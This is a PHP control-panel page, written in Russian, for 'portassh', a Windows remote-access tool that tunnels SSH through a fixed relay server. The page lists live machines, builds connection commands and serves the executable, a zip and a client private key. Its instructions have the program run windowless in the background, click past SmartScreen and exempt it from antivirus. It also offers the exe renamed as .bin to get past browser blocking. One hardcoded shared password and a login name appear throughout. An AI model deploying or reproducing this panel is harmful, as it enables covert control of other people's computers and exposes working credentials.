<?php
/**
 * portassh — АКТИВНЫЕ клиентские машины (live).
 *
 * Активной считается машина, чей экземпляр portassh подтверждал туннель
 * в последние 3 минуты (heartbeat раз в минуту). Реестр читается из
 * приватной папки сайта, куда relay-хост копирует его cron'ом каждую минуту:
 *   * * * * * tail -n 2000 /home/portassh/online.txt 2>/dev/null > <этот файл>
 *
 * Секретный адрес — не публикуйте ссылку.
 */
$PRIVATE     = '/home/user/web/itstandart.kz/private'; // каталог артефактов (реестр, сборки, ключ)
$REGISTRY    = "$PRIVATE/portassh-online.txt";
$EXE         = "$PRIVATE/portassh.exe"; // сборка для скачивания (копируется cron'ом)
$RELAY       = '5.35.81.198'; // IP/домен relay-сервера для колонки «Команда подключения»
$ACTIVE_SECS = 180;           // heartbeat у exe раз в 60 с — запас ×3
$MAX_AGE     = 7 * 86400;     // записи старше недели игнорируются вовсе

// PHP-TZ может отличаться от системного (машине пишут локальное время) —
// калибруем mktime-эпохи по системным `date +%s` / `date +%H:%M`
$sysNow = (int) trim((string) @shell_exec('date +%s'));
[$sh, $sm] = explode(':', trim((string) @shell_exec('date +%H:%M')));
$SKEW = $sysNow - mktime((int)$sh, (int)$sm, 0);

header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-store');

// скачивание сборки (за тем же basic auth):
//   ?dl=zip — portassh.zip (exe + инструкция) — основной вариант
//   ?dl=bin — portassh.bin: браузеры не блокируют переименованный exe,
//             на клиенте переименовать обратно в .exe
//   ?dl=1   — портассh.exe напрямую (может блокироваться браузером)
if (isset($_GET['dl'])) {
    if ($_GET['dl'] === 'zip') {
        $file = "$PRIVATE/portassh.zip";
        $name = 'portassh.zip';
    } elseif ($_GET['dl'] === 'key') {
        $file = "$PRIVATE/portassh_client.key";
        $name = 'portassh_client.key';
        $exe = @file_get_contents($file);
        if ($exe === false) { http_response_code(404); exit('no key uploaded'); }
        header('Content-Type: text/plain; charset=utf-8');
        header('Content-Disposition: attachment; filename="' . $name . '"');
        header('Content-Length: ' . strlen($exe));
        echo $exe;
        exit;
    } elseif ($_GET['dl'] === 'bin') {
        $file = "$PRIVATE/portassh.bin";
        $name = 'portassh.bin';
    } else {
        $file = "$PRIVATE/portassh.exe";
        $name = 'portassh.exe';
    }
    $exe = @file_get_contents($file);
    if ($exe === false) { http_response_code(404); exit('no build uploaded'); }
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . $name . '"');
    header('Content-Length: ' . strlen($exe));
    echo $exe;
    exit;
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="20">
<title>portassh — активные машины</title>
<style>
  body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #12151c; color: #f0f4fb; margin: 40px; font-size: 15px; }
  h1 { font-size: 22px; }
  h1 .count { color: #34d399; }
  table { border-collapse: collapse; width: 100%; max-width: 950px; }
  th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #2a3040; }
  th { color: #c3cfe6; font-weight: 700; font-size: 13px; text-transform: uppercase; }
  tr:hover td { background: #1a1f2b; }
  .dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #34d399; margin-right: 8px;
         box-shadow: 0 0 6px #34d399; animation: pulse 2s infinite; }
  @keyframes pulse { 50% { opacity: .5; } }
  .role-admin { color: #fbbf24; font-weight: 600; }
  .role-user  { color: #4ade80; font-weight: 600; }
  .ago { color: #cbd6ea; font-size: 14px; }
  .cmd { font-family: Consolas, monospace; font-size: 14px; color: #c9dcfb; user-select: all; }
  .empty { color: #cbd6ea; font-size: 15px; }
  a.dl { color: #0f172a; background: #4ade80; padding: 7px 14px; border-radius: 6px; text-decoration: none; font-weight: 700; font-size: 14px; }
  a.dl:hover { background: #22c55e; }
  a.dl.blue { background: #60a5fa; }
  a.dl.blue:hover { background: #3b82f6; }
  .box { max-width: 950px; margin: 0 0 30px 0; background: #181d28; border: 1px solid #2a3040; border-radius: 8px; padding: 4px 22px 14px 22px; }
  .box summary { cursor: pointer; font-weight: 700; font-size: 15px; color: #9fe8bf; padding: 10px 0; }
  .box h2 { font-size: 16px; color: #c3cfe6; margin: 18px 0 8px 0; }
  .box p, .box li { font-size: 14px; line-height: 1.55; color: #dbe4f5; }
  .box ol, .box ul { margin: 6px 0 6px 22px; }
  .pwtab { margin: 8px 0 4px 0; width: auto; }
  .pwtab td, .pwtab th { border-bottom: 1px solid #2a3040; }
  .pw { font-family: Consolas, monospace; color: #fbbf24; font-weight: 700; user-select: all; }
</style>
</head>
<body>
<?php
$lines = @file($REGISTRY, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
$latest = [];
foreach ($lines as $line) {
    $p = explode(' ', trim($line));
    if (count($p) < 4) continue;
    [$host, $port, $t, $role] = $p;
    if (!in_array($role, ['user', 'admin'], true)) continue;
    // формат времени из реестра: "ДД.ММ_ЧЧ:ММ" (год не пишется)
    [$dmy, $hm] = explode('_', $t);
    [$dd, $mm] = explode('.', $dmy);
    $ts = mktime((int)substr($hm, 0, 2), (int)substr($hm, 3, 2), 0, (int)$mm, (int)$dd) + $SKEW;
    if ($ts - $sysNow > 86400) $ts = strtotime('-1 year', $ts) + $SKEW; // смена года
    if ($sysNow - $ts > $MAX_AGE) continue;
    $key = $host . '|' . $role;
    if (!isset($latest[$key]) || $latest[$key]['ts'] < $ts) {
        $latest[$key] = compact('host', 'port', 'role', 'ts', 't');
    }
}
// оставляем только живые: heartbeat раз в минуту, окно ×3
$active = array_filter($latest, fn($e) => $sysNow - $e['ts'] <= $ACTIVE_SECS);
usort($active, fn($a, $b) => $b['ts'] <=> $a['ts']);

echo '<h1>portassh — активные машины: <span class="count">' . count($active) . '</span> <span style="float:right"><a class="dl" href="?dl=zip">⬇ Скачать .zip</a> &nbsp; <a class="dl" style="background:#60a5fa" href="?dl=bin">⬇ .bin</a> &nbsp; <a class="dl" style="background:#fbbf24" href="?dl=key">🔑 Ключ</a><div style="text-align:right;color:#cbd6ea;font-size:12px;margin-top:6px">пароль архива и SSH (резерв): <b>RtnM91jK.!</b></div></span></h1>';

// ---- Описание и инструкция ----
$PW = 'RtnM91jK.!';
?>
<div class="box">
<details>
<summary>📖 Что такое portassh и как этим пользоваться — нажмите, чтобы раскрыть/свернуть</summary>

<h2>Что это</h2>
<p>portassh — инструмент удалённого доступа к компьютерам через SSH-туннель. На целевом
компьютере запускается <b>portassh.exe</b>: он сам прокладывает туннель через relay-сервер
(VPS 5.35.81.198) и держит его открытым. Никаких пробросок портов на роутере и настроек
сети не нужно — машина доступна, пока на ней запущен exe, даже из другой страны.</p>
<p>Эта страница — пульт дежурного: показывает <b>только активные</b> машины (экземпляр
portassh подтверждает туннель каждую минуту; машина исчезает из списка
сразу при штатном выключении/перезагрузке (exe сообщает об этом сам) или
через ~3 минуты при резком отключении — так видно разницу между «выключена»
и «зависла»). Обновление — каждые 20 секунд.</p>

<h2>Установка на целевом компьютере (Windows)</h2>
<ol>
<li>Нажмите «⬇ Скачать .zip» выше.</li>
<li>Распакуйте архив. Пароль архива: <span class="pw">RtnM91jK.!</span></li>
<li>Запустите <span class="cmd">portassh.exe</span> двойным кликом. Окна нет — так и
задумано: программа работает в фоне.</li>
</ol>
<p>Готово — через минуту компьютер появится в таблице выше.</p>
<p style="font-size:13px;color:#cbd6ea">Если Windows покажет синее окно (SmartScreen):
«Подробнее» → «Выполнить в любом случае».
Если антивирус удалил файл: добавьте portassh.exe в исключения антивируса и скачайте заново.</p>

<h2>Подключение с другого компьютера (Mac / Linux / Windows с OpenSSH)</h2>
<ol>
<li><b>Один раз:</b> нажмите «🔑 Ключ» выше — сохранится файл
<span class="cmd">portassh_client.key</span> (обычно в папку «Загрузки»).</li>
<li>Откройте терминал в той же папке:
<ul>
<li>Windows: Win+R → введите <span class="cmd">cmd</span> → Enter →
в чёрном окне введите <span class="cmd">cd %USERPROFILE%\Downloads</span></li>
<li>Mac/Linux: <span class="cmd">cd ~/Downloads</span></li>
</ul></li>
<li>Скопируйте команду нужной машины из таблицы ниже и вставьте в терминал.</li>
</ol>
<p>Всё — вы на удалённом компьютере. С ключом пароль не спросится
(пароль — запасной вариант, если ключа нет).</p>
<p style="font-size:13px;color:#cbd6ea">Команду можно запускать из любой папки, если
в ней лежит portassh_client.key. Храните ключ только у себя — он заменяет пароль.</p>
<p>Команда из таблицы выглядит так:</p>
<p class="cmd">ssh -i portassh_client.key -o StrictHostKeyChecking=accept-new -J support@5.35.81.198 -p &lt;ПОРТ&gt; anyuser@localhost</p>
<p>Если ключа нет (или он не подхватился), подключение попросит пароль <b>два раза</b> —
оба раза вводится один и тот же пароль (резервный вход):</p>
<table class="pwtab">
<tr><th>Запрос</th><th>Логин</th><th>Пароль</th></tr>
<tr><td>1. Прыжок через relay-сервер (support@…)</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
<tr><td>2. Целевая машина (anyuser@localhost)</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
</table>
<p>После входа вы в командной строке целевого компьютера (через PTY) либо сразу
выполняете одну команду, дописав её в конец: <span class="cmd">…anyuser@localhost "dir"</span>.</p>
<p><b>Примечание:</b> на машинах со сборкой до 17:03 пароль цели не спрашивается —
там вход только по ключу администратора. После обновления на этих машинах начнёт
действовать единый пароль.</p>

<h2>Единый пароль — шпаргалка</h2>
<table class="pwtab">
<tr><th>Где</th><th>Логин</th><th>Пароль</th></tr>
<tr><td>Страница этого дашборда (basic auth браузера)</td><td>misha8585</td><td class="pw">RtnM91jK.!</td></tr>
<tr><td>Прыжок через relay (support@5.35.81.198) — с client-ключом не спрашивается</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
<tr><td>Целевая машина (встроенный SSH-сервер) — с client-ключом не спрашивается</td><td>любой</td><td class="pw">RtnM91jK.!</td></tr>
<tr><td>Zip-архив с этой страницы</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
</table>

<h2>Если что-то не работает</h2>
<ul>
<li><b>Машина не появляется в списке</b> — exe не запущен или туннель ещё поднимается
(подождите минуту). Активность в списке = exe работает прямо сейчас.</li>
<li><b>Connection refused на порту 2200</b> — туннель восстанавливается сам,
подождите до минуты; если дольше — перезапустите portassh.exe на целевой машине.
Порт у каждой машины свой и стабильный: после сбоя exe сам освобождает
«призрачный» порт прошлой сессии и возвращается на него же.</li>
<li><b>Скачивание заблокировано</b> — используйте кнопку «.bin» и переименуйте файл
обратно в portassh.exe.</li>
<li><b>Долгое зависание команды</b> — UAC-запросы (контроль учётных записей) ждут
клика на экране целевой машины; для GUI-программ запускайте в фоне: допишите
<span class="cmd">&amp;</span> в конец команды (например <span class="cmd">notepad &amp;</span>) —
сессия вернётся сразу. Есть и таймаут: <span class="cmd">timeout=60 &lt;команда&gt;</span>
— принудительно завершит команду через 60 секунд (код 124).</li>
</ul>
</details>
</div>
<table>
<tr><th>Машина</th><th>Роль</th><th>Порт</th><th>Команда подключения</th><th>Подтверждение</th></tr>
<?php
if (!$active) {
    echo '<tr><td colspan="5" class="empty">Нет активных машин — запустите portassh.exe на целевом компьютере</td></tr>';
}
foreach ($active as $e) {
    $sec = $sysNow - $e['ts'];
    $seen = $sec < 5 ? 'только что' : $sec . ' с назад';
    $cmd = "ssh -i portassh_client.key -o StrictHostKeyChecking=accept-new -J support@{$GLOBALS['RELAY']} -p {$e['port']} anyuser@localhost";
    printf(
        "<tr><td><span class=\"dot\"></span>%s</td><td class=\"role-%s\">%s</td><td>%s</td><td class=\"cmd\">%s</td><td class=\"ago\">%s</td></tr>\n",
        htmlspecialchars($e['host']),
        $e['role'],
        $e['role'] === 'admin' ? 'админ' : 'пользователь',
        htmlspecialchars($e['port']),
        htmlspecialchars($cmd),
        htmlspecialchars($seen)
    );
}
?>
</table>
</body>
</html>
